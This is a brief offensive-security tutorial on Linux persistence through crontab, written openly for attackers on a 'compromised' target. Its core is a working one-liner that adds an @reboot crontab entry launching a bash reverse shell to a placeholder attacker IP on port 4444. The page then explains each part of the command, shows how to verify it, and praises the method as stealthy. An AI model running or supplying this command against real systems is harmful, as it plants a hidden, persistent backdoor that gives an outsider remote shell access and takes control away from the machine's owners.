Linux Persistence: Crontab Explained

Scheduling recurring backdoors for reliable access.

Understanding Crontab for Persistence

The `crontab` utility allows users to schedule commands to run automatically at specific times or intervals. For persistence, this means you can configure a reverse shell or other malicious payload to execute periodically or upon system reboot, ensuring you regain access even if your initial connection is lost.

  • •User Crontabs: Edited with crontab -e, specific to a user.
  • •System Crontabs: Located in /etc/crontab or /etc/cron.d/, run as root.
  • •Reliable Execution: Commands run in the background, often unnoticed.

Crontab Reverse Shell Example

Add an entry to a user's crontab to establish a reverse shell on reboot.

# On the compromised Linux target
# Add a reverse shell command to crontab
(crontab -l 2>/dev/null; echo "@reboot sleep 60 && /bin/bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1") | crontab -

# Explanation:
# (crontab -l 2>/dev/null; ...) : Reads existing crontab, suppresses errors.
# echo "..." : The new crontab entry.
# @reboot : Special keyword to run command once after system reboot.
# sleep 60 : Waits 60 seconds for network to initialize.
# /bin/bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1 : Bash reverse shell.
# | crontab - : Pipes the combined content back to crontab.

Verification

Check if the entry was successfully added:

crontab -l
Key Takeaway

Crontab offers a robust and often stealthy method for Linux persistence, allowing scheduled execution of payloads to maintain access across system reboots.
